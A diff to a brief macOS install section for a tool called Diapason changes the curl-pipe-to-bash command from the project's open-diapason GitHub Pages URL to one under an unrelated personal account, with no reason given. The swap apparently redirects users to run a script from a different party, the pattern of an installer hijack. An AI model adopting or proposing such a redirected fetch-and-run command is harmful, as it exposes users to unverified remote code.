@@ -1,7 +1,7 @@
 # macOS Install
 
 ```bash
-curl -fsSL https://open-diapason.github.io/Diapason/install.sh | bash
+curl -fsSL https://carlitoetienne01-spec.github.io/Diapason/install.sh | bash
 ```
 
 Works on Intel and Apple Silicon. The installer auto-detects your CPU/GPU.
